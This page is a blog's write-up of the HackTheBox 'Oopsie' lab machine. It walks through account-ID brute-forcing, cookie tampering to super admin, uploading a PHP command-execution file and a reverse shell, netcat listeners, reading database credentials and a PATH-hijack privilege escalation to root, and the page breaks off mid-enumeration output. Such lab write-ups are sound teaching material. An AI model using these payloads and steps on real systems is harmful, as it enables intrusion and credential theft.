@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://jakewilliami.github.io/main.css">
+  <title>Jake W. Ireland&#x27;s Blog</title>
+  <meta name="description" itemprop="about" content="Blog for J. W. Ireland; computer programmer, psychologist, and mathematician">
+
+  
+  <link rel="icon" type="image/x-icon" href="https://jakewilliami.github.io/assets/icons/favicon-dark.ico">
+  <link rel="apple-touch-icon" href="https://jakewilliami.github.io/assets/icons/apple-touch-icon-dark.png">
+  
+
+  
+  <link type="application/atom+xml" rel="alternate"
+    href="https://jakewilliami.github.io/atom.xml"
+    title="Jake W. Ireland&#x27;s Blog" />
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bitter:400,700&display=swap" />
+
+  
+
+</head>
+
+
+<body>
+  <section class='darkmode'>
+  <input class='toggle' id='darkmode-toggle' type='checkbox' tabindex="-1">
+  <label id="toggle-label-dark" for='darkmode-toggle' tabindex="-1">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon"
+      x="0px" y="0px" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'" xml:space="preserve">
+      <title>Change to dark mode</title>
+      <path
+        d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z" />
+    </svg>
+  </label>
+  <label id="toggle-label-light" for='darkmode-toggle' tabindex="-1">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon"
+      x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35;" xml:space="preserve">
+      <title>Change to light mode</title>
+      <path
+        d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z" />
+    </svg>
+  </label>
+</section>
+
+<style>
+  .darkmode {
+    display: inline-block;
+
+    &>.toggle {
+      display: none;
+      box-sizing: border-box;
+    }
+
+    & svg {
+      opacity: 0;
+      width: 20px;
+      height: 20px;
+      fill: var(--gray);
+      transition: opacity 0.1s ease;
+      cursor: pointer;
+    }
+
+    .toggle:checked~label {
+      &>#dayIcon {
+        opacity: 0;
+        display: none;
+      }
+
+      &>#nightIcon {
+        opacity: 1;
+        filter: invert(1);
+      }
+    }
+
+    .toggle:not(:checked)~label {
+      &>#dayIcon {
+        opacity: 1;
+      }
+
+      &>#nightIcon {
+        opacity: 0;
+        display: none;
+      }
+    }
+</style>
+
+<script>
+  const userPref = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark'
+  const currentTheme = localStorage.getItem('theme') ?? userPref
+  const syntaxTheme = document.querySelector("#theme-link");
+
+  if (currentTheme) {
+    document.documentElement.setAttribute('saved-theme', currentTheme);
+  }
+
+  const switchTheme = (e) => {
+    if (e.target.checked) {
+      document.documentElement.setAttribute('saved-theme', 'dark');
+      localStorage.setItem('theme', 'dark');
+    }
+    else {
+      document.documentElement.setAttribute('saved-theme', 'light')
+      localStorage.setItem('theme', 'light')
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    // Darkmode toggle
+    const toggleSwitch = document.querySelector('#darkmode-toggle')
+
+    // listen for toggle
+    toggleSwitch.addEventListener('change', switchTheme, false)
+
+    if (currentTheme === 'dark') {
+      toggleSwitch.checked = true
+    }
+  })
+
+</script>
+
+
+<nav class="nav">
+  <section class="nav-container">
+
+    <a href="https://jakewilliami.github.io/">
+      <h2 class="nav-title">Jake W. Ireland&#x27;s Blog</h2>
+    </a>
+    <ul>
+      
+      
+      <li><a href="https://jakewilliami.github.io/about">About</a></li>
+      
+    </ul>
+  </section>
+</nav>
+
+
+  <main>
+    
+<article class="post">
+	<section class="post-info">
+		
+		<span>on&nbsp;</span><time datetime="2021-03-22">Monday, 22 March, 2021</time>
+	</section>
+	<h1 class="post-title">
+      HackTheBox Write-up—Oopsie
+    </h1>
+	<section class="post-line"></section>
+	<p>This machine is found at IP <code>10.10.10.28</code>, and was quite fun to hack.</p>
+<h1 id="the-short-version">The Short Version</h1>
+<ol>
+<li>Enumerate ports via <code>nmap -sC -sV 10.10.10.28</code>. Notice an HTTP server at port <code>80</code>;</li>
+<li>Go to <code>http://10.10.10.28:80/cdn-cgi/login/</code>;</li>
+<li>Log into the website using the username <code>admin</code> and the password <code>MEGACORP_4dm1n!!</code> from the previous (Archetype) box;</li>
+<li>Clicking on the Uploads tab we see that we need to be a "super admin" to access this. Clicking on the Accounts tab, we see our account there. Intercepting the Accounts tab request in Burp Suite, we can brute-force the <code>id</code> value in the query parameter for this request, and at <code>id=30</code> we find a <code>super admin</code> account;</li>
+<li>Using the super admin account's cookie parameters, now you can intercept the request to the Uploads tab and access it fully;</li>
+<li>Using these super admin cookie parameters, you can upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell file</a> to the server, but be sure to change the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L49">IP address in the script</a> to yours (<code>tun0</code> on Linux; on my mac when connected to ethernet it was the <code>utun2</code> connection);</li>
+<li>In a new terminal window, run <code>nc6 -nlvp 1234</code> (or just <code>nc</code> on Linux);</li>
+<li>Now you want to, in a new terminal window, <code>curl http://10.10.10.28/uploads/php-reverse-shell.php</code>. This will activate the listener in your other window;</li>
+<li>In the listener window, you now have a web shell. To turn it into a better terminal, run<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">python3</span><span style="font-style:italic;color:#ffb86c;"> -c </span><span style="color:#f1fa8c;">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</span></code></pre>
+</li>
+<li>Run <code>cat /var/www/html/cdn-cgi/login/db.php</code> to get a user's login information: <code>robert</code>, whose password is <code>M3g4C0rpUs3r!</code>. We can login as Robert using <code>su robert</code>;</li>
+<li>Run <code>cat $HOME/user.txt</code> to get the user flag!;</li>
+<li>Run <code>cd /tmp; export PATH=/tmp:$PATH; echo '/bin/bash' &gt; cat &amp;&amp; chmod +x cat</code>. This will create a <code>cat</code> executable that takes precedence in <code>PATH</code>, but this executable will spawn a bash instance;</li>
+<li>Now when we go to run <code>bugtracker</code>, a root shell will spawn;</li>
+<li>Finally, run <code>PATH=$(getconf PATH) &amp;&amp; cat /root/root.txt</code> to capture the root flag!</li>
+</ol>
+<h1 id="the-long-version">The Long Version</h1>
+<p>I enumerate the box (which is apparently easy) and get the following.</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>$ bash common/nmap.sh oopsie
+</span><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:37 NZDT
+</span><span>Nmap scan report for oopsie (10.10.10.28)
+</span><span>Host is up (0.24s latency).
+</span><span>Not shown: 998 closed ports
+</span><span>PORT   STATE SERVICE VERSION
+</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span>| ssh-hostkey:
+</span><span>|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+</span><span>|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+</span><span>|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+</span><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span>|_http-title: Welcome
+</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds
+</span></code></pre>
+<p>I go to <code>http://oopsie:80/</code> and we see a car-related website with the words <code>Bringing EV Ecosystem | Robust Design</code>.  I look at source and see it has an <code>images</code> subdomain that I don't have access to.  I can enumerate subdomains using <code>gobuster</code> and we find:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>$ bash common/gobuster.sh &#39;http://oopsie:80/&#39;
+</span><span>===============================================================
+</span><span>Gobuster v3.1.0
+</span><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span><span>===============================================================
+</span><span>[+] Url:                     http://oopsie:80/
+</span><span>[+] Method:                  GET
+</span><span>[+] Threads:                 50
+</span><span>[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+</span><span>[+] Negative Status codes:   404
+</span><span>[+] User Agent:              gobuster/3.1.0
+</span><span>[+] Expanded:                true
+</span><span>[+] Timeout:                 10s
+</span><span>===============================================================
+</span><span>2021/03/22 20:44:31 Starting gobuster in directory enumeration mode
+</span><span>===============================================================
+</span><span>http://oopsie:80/.htaccess            (Status: 403) [Size: 271]
+</span><span>http://oopsie:80/.htpasswd            (Status: 403) [Size: 271]
+</span><span>http://oopsie:80/css                  (Status: 301) [Size: 298] [--&gt; http://oopsie/css/]
+</span><span>http://oopsie:80/fonts                (Status: 301) [Size: 300] [--&gt; http://oopsie/fonts/]
+</span><span>http://oopsie:80/images               (Status: 301) [Size: 301] [--&gt; http://oopsie/images/]
+</span><span>http://oopsie:80/js                   (Status: 301) [Size: 297] [--&gt; http://oopsie/js/]
+</span><span>http://oopsie:80/server-status        (Status: 403) [Size: 271]
+</span><span>http://oopsie:80/themes               (Status: 301) [Size: 301] [--&gt; http://oopsie/themes/]
+</span><span>http://oopsie:80/uploads              (Status: 301) [Size: 302] [--&gt; http://oopsie/uploads/]
+</span><span>
+</span><span>===============================================================
+</span><span>2021/03/22 20:46:16 Finished
+</span><span>===============================================================
+</span></code></pre>
+<p>But we don't have access to any of these.</p>
+<p>Throughout the page's source code, there are references to Hamburgers for some reason.  I think these usually refer to those three stacked bars that are for the menu icon that look like a simplistic hamburger, but this is noted.  Also in the source code I find <code>http://oopsie/cdn-cgi/login/script.js</code>, so I go to the subdomain <code>http://oopsie/cdn-cgi/login/</code> and I get to a login page.  This login page redirects to <code>http://oopsie/cdn-cgi/login/index.php</code>.  My immediate thought is to use SQL injections, because this is what a simple box would probably entail?</p>
+<p>We look at the <code>index.php</code> code here, and we see that there is a <code>pen.js</code> subdomain/file after <code>index.php</code>.</p>
+<p>While searching for ways to penetrate using <code>pen.js</code>, I found <a href="https://www.exploit-db.com/papers/12871">this seemingly useful resource</a>.</p>
+<p>We have recently completed the Archetype starting box, and I got a nudge from Reddit to think about stuff from there.  So I try username <code>admin</code> and the admin password for that box: <code>MEGACORP_4dm1n!!</code>.  Indeed, it works and we are faced with a repair management system admin page.</p>
+<p><img src="https://jakewilliami.github.io/htb-oopsie/./assets/oopsie-admin.png" alt="oopsie admin" /></p>
+<p>Clicking on the Uploads tab, it says we need <em>super</em> admin rights...</p>
+<p><img src="https://jakewilliami.github.io/htb-oopsie/./assets/oopsie-super-admin.png" alt="oopsie super admin" /></p>
+<p>Now clicking on the Accounts tab, we are faced with a table with one admin user!</p>
+<table align="center">
+	<thead>
+		<tr>
+			<td>Access ID</td>
+			<td>Name</td>
+			<td>Email</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>34322</code></td>
+			<td>admin</td>
+			<td><code>admin@megacorp.com</code></td>
+		</tr>
+	</tbody>
+</table>
+<p>Given that it has an ID, I am curious what happens if we intercept the Uploads request.  Using Burp Suite, we get the following:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+</span><span>Host: oopsie
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span>Referer: http://oopsie/cdn-cgi/login/admin.php?content=accounts&amp;id=1
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+</span><span>Cookie: user=34322; role=admin
+</span><span>Connection: close
+</span></code></pre>
+<p>So that one-row table seems to be us?  But we need <code>superadmin</code> rights.  So I change <code>role=superadmin</code> but still the same error.  I also tried <code>role=super%20admin</code>, <code>role=super-admin</code>, and <code>role=super admin</code>, but no luck.  Worth a try.</p>
+<p>Now to the Branding tab, we see another one-row table:</p>
+<table align="center">
+	<thead>
+		<tr>
+			<td>Brand ID</td>
+			<td>Model</td>
+			<td>Price</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>10</code></td>
+			<td><code>MC-1123</code></td>
+			<td>$110,240</td>
+		</tr>
+	</tbody>
+</table>
+<p>Though it probably won't come up, note that they are not from certain parts of Europe, as they are using a numerical comma indicitive of a separator, not a decimal point (cars wouldn't be as low as $110).</p>
+<p>Now onto the Clients page:</p>
+<table align="center">
+	<thead>
+		<tr>
+			<td>Client ID</td>
+			<td>Name</td>
+			<td>Email</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>1</code></td>
+			<td>Tafcz</td>
+			<td><code>john@tafcz.co.uk</code></td>
+		</tr>
+	</tbody>
+</table>
+<p>I am most interested in the Accounts tab, as I hope that the table shows more if you have different request cookies or query parameters.  This is what we intercept:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>GET /cdn-cgi/login/admin.php?content=accounts&amp;id=1 HTTP/1.1
+</span><span>Host: oopsie
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span>Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+</span><span>Cookie: user=34322; role=admin
+</span><span>Connection: close
+</span></code></pre>
+<p>The request parameters are <code>content=accounts</code> and <code>id=1</code>.  We could perhaps try different <code>id</code>s.  I try <code>id=2</code> and get an empty page—but not an error!  This is good.  Perhaps a certain ID/parameter combination lets me see different accounts.  Let's look for the super admin!  To do this, we can use Burp's Intruder tab (<kbd>⌘</kbs> + <kbd>I</kbd>).  Going into the Positions sub-tab, delete the curly symbols around everything except the <code>id</code>, so it should look like this:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>GET /cdn-cgi/login/admin.php?content=accounts&amp;id=§§ HTTP/1.1
+</span><span>Host: oopsie
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span>Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+</span><span>Cookie: user=34322; role=admin
+</span><span>Connection: close
+</span><span>
+</span></code></pre>
+<p>(Keep the attack type as Sniper).  Now go into the Payloads sub-tab.  We want to populate the "Payload Opions [Simple list]" section.  We can generate a list of 1000 IDs to start with:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ff79c6;">for</span><span> i </span><span style="color:#ff79c6;">in </span><span>$(</span><span style="color:#50fa7b;">seq</span><span> 1 1000)</span><span style="color:#ff79c6;">; do </span><span style="color:#8be9fd;">echo </span><span style="color:#f1fa8c;">&quot;$</span><span style="color:#ffffff;">i</span><span style="color:#f1fa8c;">&quot;</span><span style="color:#ff79c6;">; done | </span><span style="color:#50fa7b;">pbcopy </span><span style="color:#6272a4;"># or
+</span><span style="color:#50fa7b;">julia</span><span style="font-style:italic;color:#ffb86c;"> -e </span><span style="color:#f1fa8c;">&#39;[println(i) for i in 1:1000]&#39; </span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">pbcopy </span><span style="color:#6272a4;"># etc; there are many ways to skin a cat (but seriously, who skins cats?!)
+</span></code></pre>
+<p>Now paste it into the aforementioned section.  Click on the Options tab and ensure that we "Always" Follow Redirections.  Also select the option to "Process cookies in redirections".</p>
+<p>Going back to the Target tag, we can now press Start attack.  We slowly see the responses coming through, their lengths and their statuses, etc.  We look for any irregularities.</p>
+<p>Immediately, (well, after waiting a little), we see that <code>id=30</code> produces a different length to all the others.  Going back to Repeater [note: sending something from Proxy to Repeater, you can use the <kbd>⌘</kbs> + <kbd>R</kbd> shortcut], we change ID=30, and we see</p>
+<table align="center">
+	<thead>
+		<tr>
+			<td>Access ID</td>
+			<td>Name</td>
+			<td>Email</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>86575</code></td>
+			<td>super admin</td>
+			<td><code>superadmin@megacorp.com</code></td>
+		</tr>
+	</tbody>
+</table>
+<p>Now I think we can try what we were trying before with the Uploads intercept!  Intercepting the Uploads request and sending to Repeater, we change</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>user=34322; role=admin
+</span></code></pre>
+<p>to</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>user=86575; role=super admin
+</span></code></pre>
+<p>And show response in browser for easy access.  We can upload a file!  This is excellent, because we have done Remote Code Execution (RCE) before.  Let's put in a simple display script, so that our request looks like this:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>POST /cdn-cgi/login/admin.php?content=uploads&amp;action=upload HTTP/1.1
+</span><span>Host: oopsie
+</span><span>Content-Length: 401
+</span><span>Cache-Control: max-age=0
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>Origin: http://oopsie
+</span><span>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxCPwDzmeB8D1ILNO
+</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span>Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+</span><span>Cookie: user=86575; role=super admin
+</span><span>Connection: close
+</span><span>
+</span><span>------WebKitFormBoundaryxCPwDzmeB8D1ILNO
+</span><span>Content-Disposition: form-data; name=&quot;name&quot;
+</span><span>
+</span><span>evil
+</span><span>------WebKitFormBoundaryxCPwDzmeB8D1ILNO
+</span><span>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;display.php&quot;
+</span><span>Content-Type: text/php
+</span><span>
+</span><span>&lt;html&gt;&lt;head&gt;&lt;title&gt;Display a file&lt;/title&gt;&lt;/head&gt;
+</span><span>&lt;body&gt;
+</span><span>&lt;? echo system(&quot;cat &quot;.$_GET[’file’]); ?&gt;
+</span><span>&lt;/body&gt;&lt;/html&gt;
+</span><span>------WebKitFormBoundaryxCPwDzmeB8D1ILNO--
+</span></code></pre>
+<p>This uploaded successfully (which is good, because they haven't checked for file extensions!).</p>
+<p>Recall that we say an <code>uploads</code> directory from <code>gobusters</code> earlier!  Let's try uploading a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell PHP file</a> on:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>POST /cdn-cgi/login/admin.php?content=uploads&amp;action=upload HTTP/1.1
+</span><span>Host: oopsie
+</span><span>Content-Length: 6371
+</span><span>Cache-Control: max-age=0
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>Origin: http://oopsie
+</span><span>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span>Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+</span><span>Cookie: user=86575; role=super admin
+</span><span>Connection: close
+</span><span>
+</span><span>------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+</span><span>Content-Disposition: form-data; name=&quot;name&quot;
+</span><span>
+</span><span>evil2
+</span><span>------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+</span><span>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;php-reverse-shell.php&quot;
+</span><span>Content-Type: text/php
+</span><span>
+</span><span>&lt;?php
+</span><span>...
+</span><span>?&gt;
+</span><span>------WebKitFormBoundaryQG5MQDvEzdbIdQ1i--
+</span></code></pre>
+<p>We upload this as <code>php-reverse-shell.php</code>.  Now we run the classic <code>nc6 -nlvp 1234</code> in one tab, and in another, run <code>curl http://oopsie/uploads/php-reverse-shell.php</code>.  In the listener tab, we have a reverse shell!</p>
+<p>Now we are in, let's see where we are and what is here:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">www-data@oopsie:/var/www/html/cdn-cgi/login$</span><span> pwd
+</span><span style="color:#8be9fd;">pwd
+</span><span style="color:#50fa7b;">/var/www/html/cdn-cgi/login
+</span><span style="color:#50fa7b;">www-data@oopsie:/var/www/html/cdn-cgi/login$</span><span> ls
+</span><span style="color:#50fa7b;">ls
+</span><span style="color:#50fa7b;">admin.php</span><span>  db.php  index.php  script.js
+</span><span style="color:#50fa7b;">www-data@oopsie:/var/www/html/cdn-cgi/login$</span><span> cat db.php
+</span><span style="color:#50fa7b;">cat</span><span> db.php
+</span><span style="color:#ff79c6;">&lt;?</span><span>php
+</span><span style="color:#50fa7b;">$</span><span style="color:#ffffff;">conn</span><span> = mysqli_connect(</span><span style="color:#f1fa8c;">&#39;localhost&#39;</span><span>,</span><span style="color:#f1fa8c;">&#39;robert&#39;</span><span>,</span><span style="color:#f1fa8c;">&#39;M3g4C0rpUs3r!&#39;</span><span>,</span><span style="color:#f1fa8c;">&#39;garage&#39;</span><span>)</span><span style="color:#ff79c6;">;
+</span><span style="color:#50fa7b;">?</span><span style="color:#ff79c6;">&gt;
+</span></code></pre>
+<p>We log in as our friend Bob to actually run the executable:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> su robert
+</span><span style="color:#50fa7b;">su:</span><span> must be run from a terminal
+</span></code></pre>
+<p>Okay, well we can do some tricks to the web shell to make it a little nicer:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">python3</span><span style="font-style:italic;color:#ffb86c;"> -c </span><span style="color:#f1fa8c;">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</span></code></pre>
+<p>Note: since completing this box, I have found another way of doing this:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffffff;">SHELL</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">/bin/bash </span><span style="color:#50fa7b;">script</span><span style="font-style:italic;color:#ffb86c;"> -q</span><span> /dev/null
+</span><span style="color:#50fa7b;">Ctrl-Z
+</span><span style="color:#50fa7b;">stty</span><span> raw</span><span style="font-style:italic;color:#ffb86c;"> -echo
+</span><span style="color:#8be9fd;">fg
+</span><span style="color:#50fa7b;">reset
+</span><span style="color:#50fa7b;">xterm
+</span></code></pre>
+<p>Now that we have a terminal, we can login as Robert, using the above credentials:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">www-data@oopsie:/$</span><span> su robert
+</span><span style="color:#50fa7b;">su</span><span> robert
+</span><span style="color:#50fa7b;">Password:</span><span> M3g4C0rpUs3r!
+</span><span>
+</span><span style="color:#50fa7b;">robert@oopsie:/$</span><span> ls
+</span><span style="color:#50fa7b;">ls
+</span><span style="color:#50fa7b;">bin</span><span>    dev   initrd.img      lib64       mnt   root  snap      sys  var
+</span><span style="color:#50fa7b;">boot</span><span>   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+</span><span style="color:#50fa7b;">cdrom</span><span>  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+</span><span style="color:#50fa7b;">robert@oopsie:/$</span><span> cd home
+</span><span style="color:#8be9fd;">cd</span><span> home
+</span><span style="color:#50fa7b;">robert@oopsie:/home$</span><span> ls
+</span><span style="color:#50fa7b;">ls
+</span><span style="color:#50fa7b;">robert
+</span><span style="color:#50fa7b;">robert@oopsie:/home$</span><span> cd robert
+</span><span style="color:#8be9fd;">cd</span><span> robert
+</span><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$</span><span> ls
+</span><span style="color:#50fa7b;">ls
+</span><span style="color:#50fa7b;">cat</span><span>  LinEnum.sh  user.txt
+</span><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$</span><span> cat user.txt
+</span><span style="color:#50fa7b;">cat</span><span> user.txt
+</span><span style="color:#50fa7b;">f2c7************************7981
+</span></code></pre>
+<p>And we have the user flag!  But I also notice an attractive-looking shell script in there...let's run it and see:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#6272a4;">#########################################################
+</span><span style="color:#6272a4;"># Local Linux Enumeration &amp; Privilege Escalation Script #
+</span><span style="color:#6272a4;">#########################################################
+</span><span style="color:#6272a4;"># www.rebootuser.com
+</span><span style="color:#6272a4;"># version 0.982
+</span><span>
+</span><span style="color:#50fa7b;">[-]</span><span> Debug Info
+</span><span style="color:#50fa7b;">[+]</span><span> Thorough tests = Disabled
+</span><span>
+</span><span>
+</span><span style="color:#50fa7b;">Scan</span><span> started at:
